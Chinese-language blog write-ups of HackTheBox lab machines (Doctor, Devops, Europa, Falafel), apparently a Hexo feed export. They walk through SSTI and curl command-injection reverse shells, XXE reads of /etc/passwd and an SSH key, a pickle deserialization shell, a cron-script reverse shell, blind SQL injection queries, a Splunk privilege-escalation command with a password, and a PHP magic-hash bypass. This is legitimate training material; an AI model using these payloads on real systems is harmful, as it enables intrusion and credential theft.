<p><img src="/images/doctor/8.png" alt="8"></p>
<p>看来它确实容易收到xss攻击，而且我们的输入会被提交到这个页面里，这里依靠经验的话，可以猜到另一种注入方式<code>服务端模板注入(SSTI)</code><br>这种漏洞一般在ctf的python环境下会考，大致的原理是用户的输入发送到服务器，服务器后端解释后返回给浏览器，从而生成一些定制的内容</p>
<p>在配置错误的情况下容易导致RCE，对于网站的测试流程，可以找到一篇文章:<a href="https://www.we45.com/blog/server-side-template-injection-a-crash-course-">链接</a></p>
<p>对此漏洞，我们尝试一些测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;2*2&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/doctor/9.png" alt="9"></p>
<p>看来payload成功被解释了，可以确认漏洞存在<br>尝试一下RCE命令，payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/doctor/10.png" alt="10"></p>
<p>RCE成功，现在反弹shell，这里使用<code>nc.traditional</code>，payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;nc.traditional 10.10.16.2 443 -e &#x2F;bin&#x2F;bash&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/doctor/11.png" alt="11"></p>
<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>还是留言版那里，输入自己的IP地址，疑似命令注入漏洞</p>
<p><img src="/images/doctor/17.png" alt="17"></p>
<p>发现当前运行的程序是curl</p>
<p>尝试正常的命令注入的各类符号，这里应该是不能直接连续执行bash命令的</p>
<p>ping命令没反应</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(ping 10.10.16.4)</span><br></pre></td></tr></table></figure>

<p>用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(whoami)</span><br></pre></td></tr></table></figure>

<p>执行成功，用户名员应该是web</p>
<p><img src="/images/doctor/18.png" alt="18"></p>
<p>尝试空格符号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(echo+test)				不成功</span><br><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(echo$IFS&#39;test&#39;)			成功</span><br></pre></td></tr></table></figure>

<p><img src="/images/doctor/19.png" alt="19"></p>
<p>这题以前CTF也遇到过，当时还是个二次注入的curl注入/(ㄒoㄒ)/~~</p>
<p>此时的思路应该为无管道符直接反弹shell或者文件落地，这两种方法都行</p>
<p>写一个反弹shell保存在evil这个文件里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;evil$IFS&#39;-o&#39;$IFS&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;test&#39;</span><br></pre></td></tr></table></figure>

<p>之后IP访问(不要HOST访问)，就可以发现文件被上传了</p>
<p><img src="/images/doctor/20.png" alt="20"></p>
<p>这里是为了确保看到文件回显，更保险一点，应该上传到tmp，避免web目录不存在或者权限问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(bash$IFS&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;test&#39;)</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(nc.traditional$IFS&#39;10.10.16.4&#39;$IFS&#39;5555&#39;$IFS&#39;-e&#39;$IFS&#39;&#x2F;bin&#x2F;bash&#39;)</span><br></pre></td></tr></table></figure>

<p>都能拿到shell，这里需要注意bash下的命令 解析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(ping 127.0.0.1)</span><br><span class="line">$(ping$IFS&#39;127.0.0.1&#39;)			注意引号</span><br><span class="line">&#123;ping,127.0.0.1&#125;</span><br></pre></td></tr></table></figure>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>先想办法提升到user权限，寻找一些可能存在凭据的地方</p>
<p><img src="/images/doctor/12.png" alt="12"></p>
<p>在backup关键词里，发现了显眼的文件</p>
<p><img src="/images/doctor/13.png" alt="13"></p>
<p>可以找到用户<code>shaun</code>的密码</p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>发现了一个奇怪的用户splunk</p>
<p><img src="/images/doctor/14.png" alt="14"></p>
<p>google搜索，可以发现一个可利用提权工具，<a href="https://github.com/cnotin/SplunkWhisperer2">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.16.2 --username shaun --password Guitar123 --payload &#39;nc.traditional -e &#x2F;bin&#x2F;sh 10.10.16.4 443&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/doctor/15.png" alt="15"></p>
<p>获取shell</p>
<p><img src="/images/doctor/16.png" alt="16"></p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>似乎<a href="https://github.com/epinna/tplmap">tplmap</a>在这里有不错的效果，也许可以节约时间</p>
<h2 id="跟新"><a href="#跟新" class="headerlink" title="跟新:"></a>跟新:</h2><p>看了IppSec的write up，修复ssti的方式非常厉害Orz</p>
<p>不过他对于代码注入的那部分解说的有一些错误</p>
<p>在\blog\flaskblog\posts文件里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text &#x3D; form.data</span><br><span class="line">urls &#x3D; re.findall(&#39;http[s]?:&#x2F;&#x2F;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#39;, text)</span><br><span class="line">for url in urls:</span><br><span class="line">    url &#x3D; urls[0]</span><br><span class="line">    ...正常逻辑...</span><br></pre></td></tr></table></figure>

<p>这部分黑名单没有进行严格过滤，比如大括号，举个例子</p>
<p>成功的exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; text&#x3D;&quot;http:&#x2F;&#x2F;192.168.110.1&#x2F;$(whoami)&quot;</span><br><span class="line">&gt;&gt;&gt; urls &#x3D; re.findall(&#39;http[s]?:&#x2F;&#x2F;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#39;, text)</span><br><span class="line">&gt;&gt;&gt; print (urls)</span><br><span class="line">[&#39;http:&#x2F;&#x2F;192.168.110.1&#x2F;$(whoami)&#39;]</span><br></pre></td></tr></table></figure>

<p>失败的exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; text&#x3D;&quot;http:&#x2F;&#x2F;192.168.110.1&#x2F;|whoami&quot;</span><br><span class="line">&gt;&gt;&gt; urls &#x3D; re.findall(&#39;http[s]?:&#x2F;&#x2F;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#39;, text)</span><br><span class="line">&gt;&gt;&gt; print (urls)</span><br><span class="line">[&#39;http:&#x2F;&#x2F;192.168.110.1&#x2F;&#39;]</span><br></pre></td></tr></table></figure>

<p>视频里说的<code>&#123;&#125;</code>只是格式化字符，并不影响过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; string&#x3D;&#39;a&#39;</span><br><span class="line">&gt;&gt;&gt; print(f&quot;hello &#123;string&#125;&quot;)</span><br><span class="line">hello a</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Devops</title>
    <url>/2020/06/27/HTB-Devops/</url>
    <content><![CDATA[<h1 id="Devops"><a href="#Devops" class="headerlink" title="Devops"></a>Devops</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Devops/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>5000端口为http</p>
<p><img src="/images/Devops/2.jpg" alt="2"></p>
<p>不过该页面下没有任何发现，开始目录扫描</p>
<p><img src="/images/Devops/3.jpg" alt="3"></p>
<p>发现目录upload</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><img src="/images/Devops/4.jpg" alt="4"></p>
<p>该页面提示允许上传XML文件，而且提示了子元素名，我们可构造payload，进行XXE攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ELEMENT data (ANY)&gt;</span><br><span class="line">&lt;!ENTITY evil SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;Ars&gt;</span><br><span class="line">    &lt;Author&gt;hack&lt;&#x2F;Author&gt;</span><br><span class="line">    &lt;Subject&gt;hacker&lt;&#x2F;Subject&gt;</span><br><span class="line">    &lt;Content&gt;&amp;evil;&lt;&#x2F;Content&gt;</span><br><span class="line">&lt;&#x2F;Ars&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Devops/5.jpg" alt="5"></p>
<p>成功进行了文件读取<br>考虑到开放了SSH端口，我们能利用也只有文件读取，所以尝试读取有/bin/bash用户的私钥</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY evil SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;home&#x2F;roosa&#x2F;.ssh&#x2F;id_rsa&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Devops/6.jpg" alt="6"></p>
<p>真读到了，复制key的部分  <code>----BEGIN.....----END RSA</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch id_rsa 复制过去</span><br><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa roosa@10.10.10.91</span><br></pre></td></tr></table></figure>

<p><img src="/images/Devops/7.jpg" alt="7"></p>
<h3 id="方法2pickle"><a href="#方法2pickle" class="headerlink" title="方法2pickle"></a>方法2pickle</h3><p>主页提到当前目录存在一个文件feed.py，读取它的源码</p>
<p><img src="/images/Devops/8.jpg" alt="8"></p>
<p>这段代码表名页面newpost允许post方法的访问，我们的目录扫描也发现了这个文件<br>之后base64解码http实体，之后调用pickle.load加载这个实体</p>
<p>所以我们要构造base64编码过的payload，比如reverse_shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">from base64 import urlsafe_b64encode</span><br><span class="line"></span><br><span class="line">Payload &#x3D; &quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.100 4444 &gt;&#x2F;tmp&#x2F;f&quot;</span><br><span class="line"></span><br><span class="line">class evil(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        import os</span><br><span class="line">        return (os.system,(Payload,))</span><br><span class="line"></span><br><span class="line">print urlsafe_b64encode(pickle.dumps(evil()))</span><br></pre></td></tr></table></figure>

<p>生成payload</p>
<p><img src="/images/Devops/10.jpg" alt="10"></p>
<p>别忘了要post请求和MIME类型为text</p>
<p><img src="/images/Devops/9.jpg" alt="9"></p>
<p>成功获取shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在home目录发现了git</p>
<p><img src="/images/Devops/11.jpg" alt="11"></p>
<p>查看下git的历史记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>

<p><img src="/images/Devops/12.jpg" alt="12"></p>
<p>发现了好像有一次key的变动</p>
<p>展开内容查看变化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log -p</span><br></pre></td></tr></table></figure>

<p><img src="/images/Devops/13.jpg" alt="13"></p>
<p>发现key</p>
<p>用私钥进行登录</p>
<p><img src="/images/Devops/14.jpg" alt="14"></p>
<p>成功获取root</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Europa</title>
    <url>/2020/10/21/HTB-Europa/</url>
    <content><![CDATA[<h1 id="Europa"><a href="#Europa" class="headerlink" title="Europa"></a>Europa</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/europa/1.png" alt="1"></p>
<p>发现https</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>查看证书，可以得到一些主机名</p>
<p><img src="/images/europa/2.png" alt="2"></p>
<p>或者使用<code>sslyze</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sslyze --regular 10.10.10.22</span><br></pre></td></tr></table></figure>

<p><img src="/images/europa/3.png" alt="3"></p>
<p>添加到hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.22     admin-portal.europacorp.htb www.europacorp.htb</span><br></pre></td></tr></table></figure>

<p>之后得到一个登陆页面</p>
<p><img src="/images/europa/4.png" alt="4"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>页面需要一个邮箱，可以在证书的Issuer中找到(记得浏览器关闭代理，否则是burp的证书)</p>
<p><img src="/images/europa/5.png" alt="5"></p>
<p>尝试使用SQL注入</p>
<p><img src="/images/europa/6.png" alt="6"></p>
<p>非常容易的引发错误，看来是存在漏洞的</p>
<p>通过这条语句可以轻松绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">email&#x3D;admin@europacorp.htb&#39;-- +&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure>

<p>其实这里不一定需要知道邮箱号，可以使用limit注入，修改字段数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">email&#x3D;&#39;+or+1%3d1+limit+1%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure>

<p><img src="/images/europa/12.png" alt="12"></p>
<p>尝试使用sqlmap</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u https:&#x2F;&#x2F;admin-portal.europacorp.htb&#x2F;login.php --data &quot;email&#x3D;admin@europacorp.htb&amp;password&#x3D;admin&quot; -p email</span><br></pre></td></tr></table></figure>

<p><img src="/images/europa/15.png" alt="15"></p>
<p>跑了很久，可以发现延时注入，但是跑的很慢，而且这里碰到一个问题<br>如果sql布尔注入成功，我们就会得到302跳转到后台，此时服务端会记录我们的cookie状态为”已登录”<br>此时，如果我们使用相同的cookie，发送任意凭据，都会得到302，失去了布尔注入的判断条件 ，重新获取cookie可以获得布尔注入</p>
<p>这个还是稍微有点意思，以后可以写python针对这种情况</p>
<p><img src="/images/europa/14.png" alt="14"></p>
<p>看来sqlmap无法删除登录cookie，重新访问，获得一个”干净”的cookie，不确定。</p>
<p>进去后发现一处可以生成VPN文件</p>
<p><img src="/images/europa/7.png" alt="7"></p>
<p>有一个不寻常的参数</p>
<p><img src="/images/europa/8.png" alt="8"></p>
<p>看起来是一个正则表达式，而且可以由我们控制，再考虑到PHP环境，思考一种命令注入技术</p>
<p><code>preg_replace</code>配合<code>/e</code>可以导致命令注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">preg_replace(&quot;&#x2F;php&#x2F;e&quot;,$_GET[&#39;cmd&#39;],&quot;php&quot;);</span><br></pre></td></tr></table></figure>

<p>所以只需要加上<code>e</code>输入合法的php语法即可</p>
<p><img src="/images/europa/9.png" alt="9"></p>
<p>可以被解释</p>
<p><img src="/images/europa/10.png" alt="10"></p>
<p>之后使用系统函数就可以获得shell</p>
<p><img src="/images/europa/11.png" alt="11"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>/etc/crontab发现计划任务，5个*表示每分钟执行一次</p>
<p><img src="/images/europa/16.png" alt="16"></p>
<p>查看该文件</p>
<p><img src="/images/europa/17.png" alt="17"></p>
<p>看样子是一个php文件，但其实是一个bash脚本，没有w权限，但是<code>exec</code>又执行了一个shell脚本，而该脚本不存在</p>
<p>直接创建反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.98 4444 &gt;&#x2F;tmp&#x2F;f&#39;&gt;&#x2F;var&#x2F;www&#x2F;cmd&#x2F;logcleared.sh</span><br><span class="line">chmod 777 &#x2F;var&#x2F;www&#x2F;cmd&#x2F;logcleared.sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/europa/18.png" alt="18"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Falafel</title>
    <url>/2020/06/28/HTB-Falafel/</url>
    <content><![CDATA[<h1 id="Falafel"><a href="#Falafel" class="headerlink" title="Falafel"></a>Falafel</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Falafel/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>首页发现登录页面</p>
<p><img src="/images/Falafel/2.jpg" alt="2"></p>
<p>尝试一些常见弱口令，发现如过用户存在，如admin，页面返回</p>
<p><img src="/images/Falafel/3.jpg" alt="3"></p>
<p>用户不存在返回</p>
<p><img src="/images/Falafel/4.jpg" alt="4"></p>
<p>利用这点可以枚举用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;Names&#x2F;names.txt -d &quot;username&#x3D;FUZZ&amp;password&#x3D;admin&quot; -u http:&#x2F;&#x2F;10.10.10.73&#x2F;login.php</span><br></pre></td></tr></table></figure>

<p>进一步过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;Names&#x2F;names.txt -d &quot;username&#x3D;FUZZ&amp;password&#x3D;admin&quot; -u http:&#x2F;&#x2F;10.10.10.73&#x2F;login.php --hw 657</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/5.jpg" alt="5"></p>
<p>结果发现两个账户</p>
<p>之后再在当前页面尝试sql注入，失败</p>
<p>进行目录扫描，也进行文件枚举 php,txt</p>
<p><img src="/images/Falafel/6.jpg" alt="6"></p>
<p>发现了upload.php不过返回时302，另外发现cyberlaw.txt</p>
<p><img src="/images/Falafel/7.jpg" alt="7"></p>
<p>也是提示用户chirs</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>首先万能密码之类的注入没用，这页面有注入话应该也是盲注了</p>
<p>延时注入，失败</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; or sleep(5)#</span><br><span class="line">admin&#39; or benchmark (10000000,md5(1))#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/8.jpg" alt="8"></p>
<p>布尔注入，成功</p>
<p>真</p>
<p><img src="/images/Falafel/9.jpg" alt="9"></p>
<p>假</p>
<p><img src="/images/Falafel/10.jpg" alt="10"></p>
<p>可以确认存在布尔型盲注</p>
<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.10.10.73&#x2F;login.php&quot;  --data&#x3D;&quot;username&#x3D;admin&amp;password&#x3D;admin&quot;  -p &quot;username&quot; --level&#x3D;5 --risk&#x3D;3 --string&#x3D;&quot;Wrong identification&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/11.jpg" alt="11"></p>
<p>和预想的一样</p>
<h3 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h3><h4 id="数据库名长度"><a href="#数据库名长度" class="headerlink" title="数据库名长度"></a>数据库名长度</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and length(database())&#x3D;7 #</span><br></pre></td></tr></table></figure>

<p>得出数据库长度为7</p>
<p><img src="/images/Falafel/sql/1.jpg" alt="1"></p>
<h4 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and ascii(substr(database(),1,1))&#x3D;1		&#x2F;&#x2F;第一位</span><br><span class="line">admin&#39; and ascii(substr(database(),2,1))&#x3D;1		&#x2F;&#x2F;第二位</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/2.jpg" alt="2"></p>
<p>比如这就表示第一位ascii码为102，字母是f<br>一通操作，得到数据库名:falafel</p>
<h4 id="确认表数量"><a href="#确认表数量" class="headerlink" title="确认表数量"></a>确认表数量</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select count(*) from information_schema.TABLES where TABLE_SCHEMA&#x3D;&quot;falafel&quot;)&#x3D;1#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/3.jpg" alt="3"></p>
<p>可以发现，只有一张表</p>
<h4 id="确认表名长度"><a href="#确认表名长度" class="headerlink" title="确认表名长度"></a>确认表名长度</h4><p>确认第一张表名长度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA&#x3D;&quot;falafel&quot; limit 0,1)&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/4.jpg" alt="4"></p>
<p>表名长度为5</p>
<h4 id="确认表名"><a href="#确认表名" class="headerlink" title="确认表名"></a>确认表名</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select ascii(substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;&quot;falafel&quot; limit 0,1),1,1)))&#x3D;1     &#x2F;&#x2F;第一位</span><br><span class="line">admin&#39; and (select ascii(substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;&quot;falafel&quot; limit 0,1),2,1)))&#x3D;1	   &#x2F;&#x2F;第二位</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/5.jpg" alt="5"></p>
<p>比如这表示表名第一位ascii码为117，字母是u<br>一同操作，得到数据表名:users</p>
<h4 id="确认字段数"><a href="#确认字段数" class="headerlink" title="确认字段数"></a>确认字段数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select count(column_name) from information_schema.columns where table_schema&#x3D;&#39;falafel&#39; and table_name&#x3D;&#39;users&#39;)&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/6.jpg" alt="6"></p>
<p>字段数为4</p>
<h4 id="确认字段名长度"><a href="#确认字段名长度" class="headerlink" title="确认字段名长度"></a>确认字段名长度</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select length(column_name) from information_schema.columns where table_schema&#x3D;&#39;falafel&#39; and table_name&#x3D;&#39;users&#39; limit 0,1)&#x3D;1     &#x2F;&#x2F;第一个字段名长度</span><br><span class="line">admin&#39; and (select length(column_name) from information_schema.columns where table_schema&#x3D;&#39;falafel&#39; and table_name&#x3D;&#39;users&#39; limit 1,1)&#x3D;1     &#x2F;&#x2F;第二个字段名长度</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/7.jpg" alt="7"></p>
<p>第一个字段名长度为2<br>第二个字段名长度为8<br>第三个字段名长度为4<br>第四个字段名长度为8</p>
<h4 id="确认字段名称"><a href="#确认字段名称" class="headerlink" title="确认字段名称"></a>确认字段名称</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;falafel&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),1,1)))&#x3D;1      &#x2F;&#x2F;确认第一个字段名称第一个字母</span><br><span class="line">admin&#39; and (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;falafel&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),2,1)))&#x3D;1		 &#x2F;&#x2F;确认第一个字段名称第二个字母</span><br><span class="line">admin&#39; and (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;falafel&#39; and table_name&#x3D;&#39;users&#39; limit 1,1),1,1)))&#x3D;1		 &#x2F;&#x2F;确认第二个字段名称第一个字母</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/8.jpg" alt="8"></p>
<p>比如这里得到第一个字段名称的第一个字母的ascii码为73，字母为D</p>
<p>以此类推，字段名如下<br>ID<br>password<br>role<br>username</p>
<h4 id="确认记录数量"><a href="#确认记录数量" class="headerlink" title="确认记录数量"></a>确认记录数量</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select count(*) from falafel.users)&#x3D;1#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/9.jpg" alt="9"></p>
<p>表内有两条记录</p>
<h4 id="确认记录长度"><a href="#确认记录长度" class="headerlink" title="确认记录长度"></a>确认记录长度</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select length(role) from users limit 0,1)&#x3D;1#       &#x2F;&#x2F;确认字段role的第一条记录的长度</span><br><span class="line">admin&#39; and (select length(role) from users limit 1,1)&#x3D;1#       &#x2F;&#x2F;确认字段role的第二条记录的长度</span><br><span class="line">admin&#39; and (select length(password) from users limit 0,1)&#x3D;1#   &#x2F;&#x2F;确认字段password的第一条记录的长度</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/10.jpg" alt="10"></p>
<h4 id="确认记录内容"><a href="#确认记录内容" class="headerlink" title="确认记录内容"></a>确认记录内容</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and (select ascii(substr((select password from users limit 0,1),1,1)))&#x3D;1       &#x2F;&#x2F;确认字段password的第一条记录的第一个字母</span><br><span class="line">admin&#39; and (select ascii(substr((select password from users limit 0,1),2,1)))&#x3D;1       &#x2F;&#x2F;确认字段password的第一条记录的第二个字母</span><br><span class="line">admin&#39; and (select ascii(substr((select password from users limit 1,1),1,1)))&#x3D;1       &#x2F;&#x2F;确认字段password的第二条记录的第一个字母</span><br></pre></td></tr></table></figure>

<p><img src="/images/Falafel/sql/11.jpg" alt="11"></p>
<p>比如这表示字段password的第一条记录第一位ascii码为48，字母是0</p>
<p>一次类推</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>最后可以完美得到这张表的所有字段的所有记录</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>role</th>
<th>username</th>
<th>password</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>admin</td>
<td>admin</td>
<td>0e462096931906507119562988736854</td>
</tr>
<tr>
<td>2</td>
<td>normal</td>
<td>chris</td>
<td>d4ee02a22fc872e36d9e3751ba72ddc8</td>
</tr>
</tbody></table>
<h3 id="php-magichash漏洞"><a href="#php-magichash漏洞" class="headerlink" title="php magichash漏洞"></a>php magichash漏洞</h3><p>对上述密码进行破解</p>
<p>破解出<code>chris/juggling</code>，但admin没破解出密码<br>我们可以用chris登录进去，但啥也没有</p>
<p><img src="/images/Falafel/12.jpg" alt="12"></p>
<p>admin的hash很有意思，它以<code>0e</code>开头，如果php未进行强类型比较，会造成hash被当成科学计数法来比较的情况</p>
<p>我们随便找一个字符串，比如<code>QNKCDZO</code>它的md5值也为<code>0e</code>开头<br><code>admin/QNKCDZO</code>进行登录</p>
<p><img src="/images/Falafel/13.jpg" alt="13"></p>
<p>成功登录</p>
